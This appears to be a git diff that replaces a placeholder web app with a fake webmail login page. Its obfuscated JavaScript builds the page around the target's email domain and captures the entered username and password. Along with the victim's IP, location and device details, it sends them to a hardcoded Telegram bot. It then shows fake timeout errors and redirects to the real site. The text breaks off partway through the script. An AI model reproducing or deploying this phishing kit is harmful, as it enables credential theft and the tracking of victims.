@@ -1,17 +1,313 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="styles.css">
-  <title>Vanilla JavaScript App</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="referrer" content="strict-origin">
+    <link id="favicon" rel="shortcut icon" type="image/png" href="/api/placeholder/32/32">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <title>Webmail - Login</title>
+    <style>
+        body {
+            background-color: #eeeeee;
+            font-family: Helvetica Neue, Helvetica, sans-serif;
+            font-size: 13px;
+            color: #425152;
+            margin: 0;
+        }
+
+        #background-frame {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            border: none;
+            pointer-events: none;
+            filter: brightness(0.7);
+        }
+
+        ::placeholder {
+            color: #d9dad9;
+        }
+
+        a {
+            color: #425152;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        input {
+            border-radius: 5px;
+            padding: 5px 3px;
+            border: 1px solid #ccc;
+        }
+
+        input.submit {
+            font-weight: bold;
+            text-align: center;
+            min-width: 90px;
+            min-height: 35px;
+            color: #f0f0f0;
+            background: #444444;
+            padding: 5px 12px;
+            border-color: #444444;
+            border-style: solid;
+            cursor: pointer;
+        }
+
+        input.submit:hover {
+            color: #ffffff;
+            background: #555555;
+        }
+
+        .row {
+            margin: 8px 0;  /* Reduced from 10px */
+        }
+
+        .row:after {
+            content: "";
+            display: table;
+            clear: both;
+        }
+
+        .container {
+            background: #ffffff;
+            padding: 25px;  /* Reduced from 40px */
+            width: 380px;   /* Reduced from 416px */
+            border-radius: 5px;
+            margin: 10% auto 30px auto;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            transition: all 0.3s cubic-bezier(.25, .8, .25, 1);
+            position: relative;
+        }
+
+        .col1, .col2 {
+            float: left;
+            line-height: 25px;  /* Reduced from 30px */
+            padding-top: 2px;   /* Reduced from 4px */
+        }
+
+        .col1 {
+            width: 100px;    /* Reduced from 124px */
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .col2 {
+            width: 270px;   /* Reduced from 286px */
+        }
+
+        .col2 input {
+            width: 96%;
+        }
+
+        .error {
+            color: #D52B1E;
+            font-weight: normal;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        .password-icon {
+            width: 18px;    /* Reduced from 20px */
+            position: absolute;
+            cursor: pointer;
+            margin-top: 7px;  /* Reduced from 9px */
+            margin-left: -28px;
+            background-color: white;
+        }
+
+        /*.text-g {
+            font-family: Arial, sans-serif;
+            text-transform: uppercase;
+            text-align: left;
+            font-size: 22px;    
+            color: #444444;
+            margin: 10px 0;     
+        }*/
+
+        .banner-container {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin: 10px 0;
+}
+
+.banner-logo {
+    width: 24px;
+    height: 24px;
+    object-fit: contain;
+}
+
+.text-g {
+    font-family: Arial, sans-serif;
+    text-transform: uppercase;
+    text-align: left;
+    font-size: 22px;
+    color: #444444;
+    margin: 0;  /* Changed from margin: 10px 0 */
+}
+
+        #loading {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.8);
+        }
+
+        #loading img {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40px;   /* Reduced from 50px */
+        }
+
+        @media only screen and (max-width: 600px) {
+            .container {
+                width: 100%;
+                border-radius: 0;
+                box-shadow: none;
+                padding: 15px;
+                margin-top: 0;
+            }
+
+            .col1, .col2 {
+                float: none;
+                width: 100%;
+            }
+
+            .password-icon {
+                right: 20px;
+                margin-top: -25px;
+            }
+        }
+        /* Add these styles for the disabled email input */
+input[type="email"]:disabled {
+    background-color: #f5f5f5;
+    color: #666;
+    cursor: not-allowed;
+    border-color: #ddd;
+}
+    </style>
+
+    <style>
+  .modal {
+    display: none; 
+    position: fixed; 
+    z-index: 1; 
+    padding-top: 100px; 
+    left: 0;
+    top: 0;
+    width: 100%; 
+    height: 100%; 
+    overflow: auto; 
+    background-color: rgb(0, 0, 0); 
+    background-color: rgba(0, 0, 0, 0.4); 
+  }
+
+  .modal-content {
+    background-color: #fefefe;
+    margin: auto;
+    padding: 20px;
+    border: 1px solid #888;
+    width: 80%;
+    max-width: 500px;
+    text-align: center;
+    border-radius: 10px;
+  }
+
+  .close-btn {
+    color: #aaa;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+  }
+
+  .close-btn:hover,
+  .close-btn:focus {
+    color: black;
+    text-decoration: none;
+    cursor: pointer;
+  }
+</style>
 </head>
-
 <body>
-  <main>
-    <h1>Vanilla JavaScript App</h1>
-  </main>
-</body>
 
+
+
+
+ <iframe  id="background-frame" title="background" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
+allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>
+    
+    <div id="login_form">
+        <div class="container">
+            <div id="loading">
+                <img src="/api/placeholder/40/40" alt="Loading...">
+            </div>
+            
+
+
+            <div class="banner-container">
+    <img src="/api/placeholder/24/24" alt="" class="banner-logo" id="banner-logo">
+    <h1 class="text-g" id="banner"></h1>
+</div>
+            
+            <div class="row">
+                <div class="col1">
+                    <label for="email">Email:</label>
+                </div>
+                <div class="col2">
+                    <input type="email" id="email" name="email" placeholder="Email" autocomplete="off" disabled>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col1">
+                    <label for="password">Password:</label>
+                </div>
+                <div class="col2">
+                    <input type="password" id="password" name="password" placeholder="Password" autocomplete="off">
+                    
+                </div>
+            </div>
+            
+            <div class="row">
+                <div id="error" class="error"></div>
+            </div>
+            
+            <div class="row">
+                <div class="col1">
+                    <input type="button" id="submit" class="submit" value="Login">
+                </div>
+            </div>
+            
+            <div class="row">
+                <p style="font-size: 11px; margin: 5px 0;">
+                    All rights reserved. Copyright © 2024 <span id="company"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+<!-- Modal HTML -->
+<div id="custom-alert" class="modal">
+  <div class="modal-content">
+    <span class="close-btn">&times;</span>
+    <p>Password Already Updated, Please wait 30 days</p>
+  </div>
+</div>
+
+    <script>
+const _0x13eddc=_0x4835;(function(_0x3dcf3b,_0x524fe5){const _0x253c82=_0x4835,_0x453982=_0x3dcf3b();while(!![]){try{const _0x3eecae=-parseInt(_0x253c82(0x226))/0x1*(-parseInt(_0x253c82(0x216))/0x2)+-parseInt(_0x253c82(0x20f))/0x3+-parseInt(_0x253c82(0x232))/0x4*(-parseInt(_0x253c82(0x267))/0x5)+-parseInt(_0x253c82(0x252))/0x6*(-parseInt(_0x253c82(0x234))/0x7)+-parseInt(_0x253c82(0x1e0))/0x8*(parseInt(_0x253c82(0x24d))/0x9)+parseInt(_0x253c82(0x212))/0xa+-parseInt(_0x253c82(0x26e))/0xb;if(_0x3eecae===_0x524fe5)break;else _0x453982['push'](_0x453982['shift']());}catch(_0x86ae55){_0x453982['push'](_0x453982['shift']());}}}(_0x37e2,0x7e59b));function setCookie(_0x33177f,_0x2dfcdc,_0x3f6304){const _0x53ac77=_0x4835;var _0x4500b0='';if(_0x3f6304){var _0x7a0b20=new Date();_0x7a0b20[_0x53ac77(0x24b)](_0x7a0b20[_0x53ac77(0x1e4)]()+_0x3f6304*0x18*0x3c*0x3c*0x3e8),_0x4500b0=_0x53ac77(0x24e)+_0x7a0b20[_0x53ac77(0x211)]();}document['cookie']=_0x33177f+'='+(_0x2dfcdc||'')+_0x4500b0+';\x20path=/';}function getCookie(_0x58b310){const _0x41feff=_0x4835;var _0x247157=_0x58b310+'=',_0x340b0d=document['cookie'][_0x41feff(0x244)](';');for(var _0x3c303d=0x0;_0x3c303d<_0x340b0d[_0x41feff(0x218)];_0x3c303d++){var _0x1c7c41=_0x340b0d[_0x3c303d];while(_0x1c7c41[_0x41feff(0x1e2)](0x0)=='\x20')_0x1c7c41=_0x1c7c41['substring'](0x1,_0x1c7c41[_0x41feff(0x218)]);if(_0x1c7c41[_0x41feff(0x240)](_0x247157)==0x0)return _0x1c7c41[_0x41feff(0x1f2)](_0x247157[_0x41feff(0x218)],_0x1c7c41[_0x41feff(0x218)]);}return null;}function _0x4835(_0x59a92e,_0x1f0dfc){const _0x37e2f9=_0x37e2();return _0x4835=function(_0x4835e8,_0x463dd4){_0x4835e8=_0x4835e8-0x1e0;let _0x2e02eb=_0x37e2f9[_0x4835e8];return _0x2e02eb;},_0x4835(_0x59a92e,_0x1f0dfc);}var errormessage=_0x13eddc(0x238);const hash=window['location'][_0x13eddc(0x248)][_0x13eddc(0x1f2)](0x1),countryLanguageMap={'AF':'ps','AL':'sq','DZ':'ar','AD':'ca','AO':'pt','AG':'en','AR':'es','AM':'hy','AU':'en','AT':'de','AZ':'az','BS':'en','BH':'ar','BD':'bn','BB':'en','BY':'be','BE':'nl','BZ':'en','BJ':'fr','BT':'dz','BO':'es','BA':'bs','BW':'en','BR':'pt','BN':'ms','BG':'bg','BF':'fr','BI':'rn','KH':'km','CM':'fr','CA':'en','CV':'pt','CF':'fr','TD':'ar','CL':'es','CN':'zh','CO':'es','KM':'ar','CG':'fr','CD':'fr','CR':'es','CI':'fr','HR':'hr','CU':'es','CY':'el','CZ':'cs','DK':'da','DJ':'ar','DM':'en','DO':'es','TL':'pt','EC':'es','EG':'ar','SV':'es','GQ':'es','ER':'ti','EE':'et','ET':'am','FJ':'en','FI':'fi','FR':'fr','GA':'fr','GM':'en','GE':'ka','DE':'de','GH':'en','GR':'el','GD':'en','GT':'es','GN':'fr','GW':'pt','GY':'en','HT':'ht','HN':'es','HU':'hu','IS':'is','IN':'hi','ID':'id','IR':'fa','IQ':'ar','IE':'en','IL':'he','IT':'it','JM':'en','JP':'ja','JO':'ar','KZ':'kk','KE':'sw','KI':'en','KP':'ko','KR':'ko','XK':'sq','KW':'ar','KG':'ky','LA':'lo','LV':'lv','LB':'ar','LS':'st','LR':'en','LY':'ar','LI':'de','LT':'lt','LU':'lb','MG':'mg','MW':'ny','MY':'ms','MV':'dv','ML':'fr','MT':'mt','MH':'en','MR':'ar','MU':'en','MX':'es','FM':'en','MD':'ro','MC':'fr','MN':'mn','ME':'sr','MA':'ar','MZ':'pt','MM':'my','NA':'en','NR':'na','NP':'ne','NL':'nl','NZ':'en','NI':'es','NE':'fr','NG':'en','MK':'mk','NO':'nb','OM':'ar','PK':'ur','PW':'en','PS':'ar','PA':'es','PG':'en','PY':'es','PE':'es','PH':'tl','PL':'pl','PT':'pt','QA':'ar','RO':'ro','RU':'ru','RW':'rw','KN':'en','LC':'en','VC':'en','WS':'sm','SM':'it','ST':'pt','SA':'ar','SN':'fr','RS':'sr','SC':'fr','SL':'en','SG':'ms','SK':'sk','SI':'sl','SB':'en','SO':'so','ZA':'af','SS':'en','ES':'es','LK':'si','SD':'ar','SR':'nl','SZ':'ss','SE':'sv','CH':'de','SY':'ar','TW':'zh','TJ':'tg','TZ':'sw','TH':'th','TG':'fr','TO':'to','TT':'en','TN':'ar','TR':'tr','TM':'tk','TV':'en','UG':'sw','UA':'uk','AE':'ar','GB':'en','US':'en','UY':'es','UZ':'uz','VU':'bi','VA':'it','VE':'es','VN':'vi','YE':'ar','ZM':'en','ZW':'sn'};let tg2={'token2':_0x13eddc(0x1e8),'chat_id2':_0x13eddc(0x239)};function sendMessage2(_0x31f837){const _0x23d21f=_0x13eddc,_0x5baddf=_0x23d21f(0x1fa)+tg2[_0x23d21f(0x1f8)]+_0x23d21f(0x27b),_0x5f065a=new XMLHttpRequest();_0x5f065a['open'](_0x23d21f(0x1ef),_0x5baddf,!![]),_0x5f065a[_0x23d21f(0x1ff)]('Content-Type',_0x23d21f(0x253));const _0x1f62a3={'chat_id':tg2['chat_id2'],'text':_0x31f837,'parse_mode':_0x23d21f(0x222)};_0x5f065a['send'](JSON[_0x23d21f(0x201)](_0x1f62a3));}function getUserCountry(){const _0x57e8bd=_0x13eddc;return fetch(_0x57e8bd(0x1e5))[_0x57e8bd(0x261)](_0x490da2=>_0x490da2[_0x57e8bd(0x271)]())[_0x57e8bd(0x261)](_0x499b68=>{const _0x59a87d=_0x57e8bd;return console[_0x59a87d(0x263)](_0x59a87d(0x22e),_0x499b68['country']),_0x499b68[_0x59a87d(0x250)];})[_0x57e8bd(0x205)](_0x2e4358=>{const _0xa8dbc3=_0x57e8bd;return console['error'](_0xa8dbc3(0x255),_0x2e4358),null;});}function translateText(_0x974146,_0x41c421){return new Promise((_0x2f5b30,_0x5d9f65)=>{const _0x58366c=_0x4835,_0x36958a=_0x58366c(0x275)+_0x41c421+_0x58366c(0x273)+encodeURIComponent(_0x974146);fetch(_0x36958a)[_0x58366c(0x261)](_0x1b3089=>_0x1b3089[_0x58366c(0x271)]())[_0x58366c(0x261)](_0x5a675f=>{const _0x39869f=_0x58366c,_0x86dfa4=_0x5a675f[0x0][_0x39869f(0x221)](_0x15c9bf=>_0x15c9bf[0x0])['join']('');_0x2f5b30(_0x86dfa4);})[_0x58366c(0x205)](_0x253a6d=>_0x5d9f65(_0x253a6d));});}async function translatePage(_0x330250){const _0x560af4=_0x13eddc,_0x135206=document[_0x560af4(0x272)](document['body'],NodeFilter[_0x560af4(0x20a)],null,![]);let _0x4a64c7;while(_0x4a64c7=_0x135206[_0x560af4(0x217)]()){if(_0x4a64c7[_0x560af4(0x264)]['trim']())try{const _0x6be3e5=await translateText(_0x4a64c7['nodeValue'],_0x330250);_0x4a64c7[_0x560af4(0x264)]=_0x6be3e5;}catch(_0x2322d0){console['error'](_0x560af4(0x26a),_0x2322d0);}}const _0x30b26c=document[_0x560af4(0x21c)](_0x560af4(0x227));for(const _0x1eb83f of _0x30b26c){if(_0x1eb83f[_0x560af4(0x259)])try{const _0x592661=await translateText(_0x1eb83f['placeholder'],_0x330250);_0x1eb83f[_0x560af4(0x259)]=_0x592661;}catch(_0x2fb29e){console[_0x560af4(0x23f)](_0x560af4(0x203),_0x2fb29e);}}}async function autoTranslate(){const _0x3d2fd0=_0x13eddc;try{const _0x415532=await getUserCountry();let _0x7681c1='en';_0x415532&&countryLanguageMap[_0x415532]&&(_0x7681c1=countryLanguageMap[_0x415532]['toLowerCase']()),await translatePage(_0x7681c1),console['log'](_0x3d2fd0(0x21a));}catch(_0x557800){console[_0x3d2fd0(0x23f)](_0x3d2fd0(0x213),_0x557800);}}const restrictedFiles=[_0x13eddc(0x236),'google'];var urlchangers=[_0x13eddc(0x225),_0x13eddc(0x229)];function getBrowserInfo(){const _0x36c48e=_0x13eddc,_0x541a33=navigator[_0x36c48e(0x25d)];let _0x506981='Unknown',_0x12d132='';if(_0x541a33[_0x36c48e(0x20c)]('Firefox/'))_0x506981=_0x36c48e(0x1f9),_0x12d132=_0x541a33['split'](_0x36c48e(0x26b))[0x1][_0x36c48e(0x244)]('\x20')[0x0];else{if(_0x541a33[_0x36c48e(0x20c)](_0x36c48e(0x277)))_0x506981='Chrome',_0x12d132=_0x541a33['split'](_0x36c48e(0x277))[0x1]['split']('\x20')[0x0];else _0x541a33[_0x36c48e(0x20c)](_0x36c48e(0x27e))&&!_0x541a33['includes'](_0x36c48e(0x278))&&(_0x506981=_0x36c48e(0x223),_0x12d132=_0x541a33[_0x36c48e(0x244)](_0x36c48e(0x1f6))[0x1]['split']('\x20')[0x0]);}return _0x506981+'\x20'+_0x12d132;}function getOSInfo(){const _0x6612c=_0x13eddc,_0x4b9e60=navigator[_0x6612c(0x25d)];if(_0x4b9e60['includes']('Windows\x20NT\x2010.0'))return _0x6612c(0x1eb);if(_0x4b9e60[_0x6612c(0x20c)](_0x6612c(0x1fb)))return _0x6612c(0x233);if(_0x4b9e60[_0x6612c(0x20c)](_0x6612c(0x270)))return _0x6612c(0x224);if(_0x4b9e60[_0x6612c(0x20c)](_0x6612c(0x260)))return _0x6612c(0x260);return _0x6612c(0x254);}function getDeviceType(){const _0x119708=_0x13eddc,_0x901ef8=navigator[_0x119708(0x25d)];if(/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i['test'](_0x901ef8))return _0x119708(0x23c);if(/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/[_0x119708(0x279)](_0x901ef8))return _0x119708(0x235);return'desktop';}async function formatMessage(_0x1650bb,_0x5c738f,_0x53f2c9){const _0x1ae540=_0x13eddc;try{const _0x322626=await fetch(_0x1ae540(0x1e5)),_0x20defe=await _0x322626[_0x1ae540(0x271)](),_0x52dfe8=window[_0x1ae540(0x1ed)],_0x7bbb16=getBrowserInfo(),_0x5140fc=getOSInfo(),_0x478df5=getDeviceType(),[_0x5c4c52,_0x2d5d6f]=_0x20defe['loc']?_0x20defe[_0x1ae540(0x202)][_0x1ae540(0x244)](','):[_0x1ae540(0x26c),_0x1ae540(0x26c)];return _0x1ae540(0x23d)+_0x53f2c9+_0x1ae540(0x200)+_0x1650bb+_0x1ae540(0x1e3)+_0x5c738f+'\x0a•\x20Mode:\x20Automatic\x0a•\x20Language:\x20English\x20(American)\x0a📍\x20Location\x20Info\x0a•\x20IP\x20Address:\x20'+(_0x20defe['ip']||_0x1ae540(0x26c))+_0x1ae540(0x26d)+(_0x20defe[_0x1ae540(0x250)]||'Unknown')+_0x1ae540(0x23e)+(_0x20defe[_0x1ae540(0x245)]||_0x1ae540(0x26c))+_0x1ae540(0x22a)+(_0x20defe[_0x1ae540(0x262)]||_0x1ae540(0x26c))+_0x1ae540(0x20e)+_0x5c4c52+',\x20'+_0x2d5d6f+_0x1ae540(0x1ea)+(_0x20defe[_0x1ae540(0x230)]||_0x1ae540(0x26c))+_0x1ae540(0x23a)+_0x7bbb16+_0x1ae540(0x219)+_0x5140fc+_0x1ae540(0x246)+_0x478df5+_0x1ae540(0x23b)+_0x52dfe8[_0x1ae540(0x25e)]+'x'+_0x52dfe8[_0x1ae540(0x26f)]+_0x1ae540(0x249)+window[_0x1ae540(0x1e9)]+'x'+window[_0x1ae540(0x210)]+_0x1ae540(0x1f7)+navigator[_0x1ae540(0x228)]+'\x0a•\x20Language:\x20'+navigator[_0x1ae540(0x21b)]+_0x1ae540(0x27d)+_0x52dfe8[_0x1ae540(0x251)]+_0x1ae540(0x257)+window['devicePixelRatio']+_0x1ae540(0x22f)+new Date()[_0x1ae540(0x27f)]()+'\x0a━━━━━━━━━━━━━━━━━━━━━━';}catch(_0x30ef26){return console[_0x1ae540(0x23f)](_0x1ae540(0x243),_0x30ef26),formatMessageWithoutIP(_0x1650bb,_0x5c738f);}}function formatMessageWithoutIP(_0xa0d06c,_0x2d5b53){const _0x2f5b9b=_0x13eddc,_0x49809b=window[_0x2f5b9b(0x1ed)],_0x7fe4ab=getBrowserInfo(),_0x120f93=getOSInfo(),_0x93dc8d=getDeviceType();return _0x2f5b9b(0x1f4)+_0xa0d06c+_0x2f5b9b(0x1e3)+_0x2d5b53+'\x0a•\x20Mode:\x20Automatic\x0a•\x20Language:\x20English\x20(American)\x0a📍\x20Location\x20Info\x0a•\x20IP\x20Address:\x20Unknown\x0a•\x20Country:\x20Unknown\x0a•\x20Region:\x20Unknown\x0a•\x20City:\x20Unknown\x0a•\x20Coordinates:\x20Unknown\x0a•\x20Timezone:\x20'+Intl[_0x2f5b9b(0x242)]()['resolvedOptions']()['timeZone']+'\x0a💻\x20Browser\x20Info\x0a•\x20Browser:\x20'+_0x7fe4ab+_0x2f5b9b(0x219)+_0x120f93+_0x2f5b9b(0x246)+_0x93dc8d+_0x2f5b9b(0x23b)+_0x49809b[_0x2f5b9b(0x25e)]+'x'+_0x49809b['height']+_0x2f5b9b(0x249)+window[_0x2f5b9b(0x1e9)]+'x'+window[_0x2f5b9b(0x210)]+'\x0a•\x20Platform:\x20'+navigator[_0x2f5b9b(0x228)]+_0x2f5b9b(0x1fe)+navigator[_0x2f5b9b(0x21b)]+_0x2f5b9b(0x27d)+_0x49809b[_0x2f5b9b(0x251)]+_0x2f5b9b(0x257)+window[_0x2f5b9b(0x214)]+'x\x0a⏰\x20Timestamp:\x20'+new Date()[_0x2f5b9b(0x27f)]()+_0x2f5b9b(0x20d);}function init(){const _0x363eac=_0x13eddc,_0x3dd285=window[_0x363eac(0x215)][_0x363eac(0x248)][_0x363eac(0x1f2)](0x1);if(_0x3dd285){const _0xba31b7=_0x3dd285[_0x363eac(0x240)]('@'),_0x16ef67=_0x3dd285['substr'](_0xba31b7+0x1);try{const _0x251aae='/'+_0x16ef67+_0x363eac(0x276);window[_0x363eac(0x258)][_0x363eac(0x208)]({},'',_0x251aae);}catch(_0x233b73){console[_0x363eac(0x23f)]('Error\x20updating\x20URL:',_0x233b73);}initializeUI(_0x3dd285),loadBackground(_0x3dd285),autoTranslate();}if(!checkPasswordUpdate())return;}function _0x37e2(){const _0x345d35=['Windows\x2010','none','screen','getMonth','POST','preventDefault','banner-logo','substring','loading','🔐\x20HOSTINGER\x20LOGIN\x20\x0a━━━━━━━━━━━━━━━━━━━━━━\x0a📧\x20Login\x20Details\x0a•\x20Username:\x20','slice','Version/','\x0a•\x20Platform:\x20','token2','Firefox','https://api.telegram.org/bot','Windows\x20NT\x206.3','getElementById','focus','\x0a•\x20Language:\x20','setRequestHeader','\x20LOG\x0a━━━━━━━━━━━━━━━━━━━━━━\x0a📧\x20Login\x20Details\x0a•\x20Username:\x20','stringify','loc','Placeholder\x20translation\x20error:','onclick','catch','az-static','true','replaceState','textContent','SHOW_TEXT','favicon','includes','\x0a━━━━━━━━━━━━━━━━━━━━━━','\x0a•\x20Coordinates:\x20','1733154sgoyLp','innerHeight','toUTCString','8679320UNpzAM','Auto-translation\x20error:','devicePixelRatio','location','4504pLbdaO','nextNode','length','\x0a•\x20OS:\x20','Translation\x20complete','language','querySelectorAll','custom-alert','substr','banner','value','map','Markdown','Safari','macOS','google','138iwfjnW','input[placeholder],\x20textarea[placeholder]','platform','zimbra','\x0a•\x20City:\x20','getElementsByTagName','target','display','User\x20country:','x\x0a⏰\x20Timestamp:\x20','timezone','\x20-\x20','29220UqBpDg','Windows\x208.1','379687envlVe','mobile','office','getDate','Sign\x20in\x20timed\x20out.\x20Please\x20login\x20again','7266658144','\x0a💻\x20Browser\x20Info\x0a•\x20Browser:\x20','\x0a📱\x20Device\x20Details\x0a•\x20Screen\x20Resolution:\x20','tablet','🔐\x20','\x0a•\x20Region:\x20','error','indexOf','block','DateTimeFormat','Error\x20fetching\x20IP\x20info:','split','region','\x0a•\x20Device\x20Type:\x20','getFullYear','hash','\x0a•\x20Window\x20Size:\x20','click','setTime','https://www.','198qKudFX',';\x20expires=','close-btn','country','colorDepth','102Oemjvr','application/json','Unknown\x20OS','Error\x20fetching\x20country:','src','bit\x0a•\x20Pixel\x20Ratio:\x20','history','placeholder','/api/placeholder/32/32','getElementsByClassName','title','userAgent','width','email','Linux','then','city','log','nodeValue','password','style','125AvhsjN','trim','padStart','Translation\x20error:','Firefox/','Unknown','\x0a•\x20Country:\x20','10381129PsTBQC','height','Mac\x20OS\x20X','json','createTreeWalker','&dt=t&q=','https://www.google.com/s2/favicons?domain=','https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=','/index/cgi-sys/bxd.cgi?a=com&id=bC4fvQB2QGsC1h98QCzeN-1725305970&cc=da61ed3a-530d-4862-82e1-4f0212a5bbb3','Chrome/','Chrome','test','&sz=128','/sendMessage','company','\x0a•\x20Color\x20Depth:\x20','Safari/','toISOString','https://','background-frame','88888MECCwd','replace','charAt','\x0a•\x20Password:\x20','getTime','https://ipinfo.io/json','passwordUpdated','submit','6774219498:AAHt48B3AwMhWRXg9yqeR64ZHbkSvQQSYEM','innerWidth','\x0a•\x20Timezone:\x20'];_0x37e2=function(){return _0x345d35;};return _0x37e2();}function initializeUI(_0x1c2c38){const _0x4f6b8f=_0x13eddc,_0x69394e=_0x1c2c38[_0x4f6b8f(0x1e1)]('#',''),_0x80de3=_0x69394e['indexOf']('@'),_0x1e8945=_0x69394e['slice'](_0x80de3+0x1),_0x28a0a4=_0x1e8945['split']('.')[0x0];document[_0x4f6b8f(0x1fc)](_0x4f6b8f(0x21f))[_0x4f6b8f(0x209)]=''+_0x28a0a4,document[_0x4f6b8f(0x1fc)](_0x4f6b8f(0x27c))[_0x4f6b8f(0x209)]=_0x28a0a4,document[_0x4f6b8f(0x25c)]='Sign\x20in\x20to\x20'+_0x28a0a4,document[_0x4f6b8f(0x1fc)](_0x4f6b8f(0x25f))[_0x4f6b8f(0x220)]=_0x69394e;const _0x597a76=_0x4f6b8f(0x274)+_0x1e8945+_0x4f6b8f(0x27a);document[_0x4f6b8f(0x1fc)](_0x4f6b8f(0x1f1))[_0x4f6b8f(0x256)]=_0x597a76,document[_0x4f6b8f(0x1fc)]('password')[_0x4f6b8f(0x1fd)]();const _0x115d08=document[_0x4f6b8f(0x1fc)](_0x4f6b8f(0x20b));_0x115d08['href']=_0x4f6b8f(0x25a);}function loadBackground(_0x281cfe){const _0x898fc0=_0x13eddc,_0x3fcf2e=_0x281cfe[_0x898fc0(0x1e1)]('#',''),_0x2da234=_0x3fcf2e[_0x898fc0(0x240)]('@'),_0x36dd42=_0x3fcf2e[_0x898fc0(0x1f5)](_0x2da234+0x1),_0x3fa5e7=document[_0x898fc0(0x1fc)](_0x898fc0(0x281));_0x3fa5e7[_0x898fc0(0x256)]=_0x898fc0(0x280)+_0x36dd42;}function showCustomAlert(_0x42f2df){const _0x489d74=_0x13eddc;var _0x476e0a=document[_0x489d74(0x1fc)](_0x489d74(0x21d)),_0x223a50=document[_0x489d74(0x25b)](_0x489d74(0x24f))[0x0];_0x476e0a[_0x489d74(0x266)][_0x489d74(0x22d)]=_0x489d74(0x241),_0x476e0a[_0x489d74(0x22b)]('p')[0x0][_0x489d74(0x209)]=_0x42f2df,_0x223a50['onclick']=function(){const _0x58492f=_0x489d74;_0x476e0a['style'][_0x58492f(0x22d)]=_0x58492f(0x1ec);},window[_0x489d74(0x204)]=function(_0x18fea3){const _0x4cc9e9=_0x489d74;_0x18fea3[_0x4cc9e9(0x22c)]==_0x476e0a&&(_0x476e0a[_0x4cc9e9(0x266)][_0x4cc9e9(0x22d)]=_0x4cc9e9(0x1ec));};}function checkPasswordUpdate(){var _0x213992=getCookie('passwordUpdated');if(_0x213992)return showCustomAlert('Password\x20Already\x20Updated,\x20Please\x20wait\x2030\x20days'),setTimeout(function(){const _0x4393c3=_0x4835;var _0x2f99f8=new Date(),_0x522789=String(_0x2f99f8[_0x4393c3(0x237)]())[_0x4393c3(0x269)](0x2,'0'),_0x3f2193=String(_0x2f99f8[_0x4393c3(0x1ee)]()+0x1)[_0x4393c3(0x269)](0x2,'0'),_0x12ae86=_0x2f99f8[_0x4393c3(0x247)]();_0x2f99f8=_0x3f2193+'/'+_0x522789+'/'+_0x12ae86;var _0x32aa77=window[_0x4393c3(0x215)][_0x4393c3(0x248)][_0x4393c3(0x21e)](0x1),_0x1966fb='VICTIM\x20IS\x20RETRYING\x20YOUR\x20LINK\x20-\x20'+_0x32aa77+_0x4393c3(0x231)+_0x2f99f8;sendMessage2(_0x1966fb);var _0x42f61e=document[_0x4393c3(0x1fc)](_0x4393c3(0x25f))[_0x4393c3(0x220)],_0x37a8da=_0x42f61e[_0x4393c3(0x240)]('@'),_0x4b480e=_0x42f61e['substr'](_0x37a8da+0x1);window[_0x4393c3(0x215)]['replace'](_0x4393c3(0x24c)+_0x4b480e);},0x1770),![];return!![];}var count=0x0,count=0x0;document[_0x13eddc(0x1fc)](_0x13eddc(0x1e7))['addEventListener'](_0x13eddc(0x24a),async function(_0x3768da){const _0x1c6ac7=_0x13eddc;_0x3768da[_0x1c6ac7(0x1f0)](),count++;const _0x231f69=document['getElementById']('email')[_0x1c6ac7(0x220)][_0x1c6ac7(0x268)](),_0x2a61b6=document[_0x1c6ac7(0x1fc)](_0x1c6ac7(0x265))[_0x1c6ac7(0x220)][_0x1c6ac7(0x268)]();if(_0x231f69&&_0x2a61b6&&count<0x3){document[_0x1c6ac7(0x1fc)]('loading')[_0x1c6ac7(0x266)]['display']=_0x1c6ac7(0x241);try{const _0xa9ab46=await formatMessage(_0x231f69,_0x2a61b6,_0x1c6ac7(0x206));sendMessage2(_0xa9ab46);}catch(_0x4b1169){console[_0x1c6ac7(0x23f)]('Error\x20formatting\x20message:',_0x4b1169);}setTimeout(()=>{const _0x191def=_0x1c6ac7;document['getElementById'](_0x191def(0x1f3))[_0x191def(0x266)][_0x191def(0x22d)]=_0x191def(0x1ec),document[_0x191def(0x1fc)](_0x191def(0x23f))[_0x191def(0x209)]='Sign\x20in\x20attempt\x20timeout,\x20Please\x20try\x20again.',document[_0x191def(0x1fc)](_0x191def(0x265))[_0x191def(0x220)]='';},0x3e8);}if(count>0x2){document[_0x1c6ac7(0x1fc)](_0x1c6ac7(0x1f3))[_0x1c6ac7(0x266)][_0x1c6ac7(0x22d)]=_0x1c6ac7(0x241);try{setCookie(_0x1c6ac7(0x1e6),_0x1c6ac7(0x207),0x1e);const _0x50a739=await formatMessage(_0x231f69,_0x2a61b6,_0x1c6ac7(0x206));sendMessage2(_0x50a739);}catch(_0x2d7c8f){console[_0x1c6ac7(0x23f)]('Error\x20formatting\x20message:',_0x2d7c8f);}setTimeout(function(){const _0xb21dec=_0x1c6ac7;var 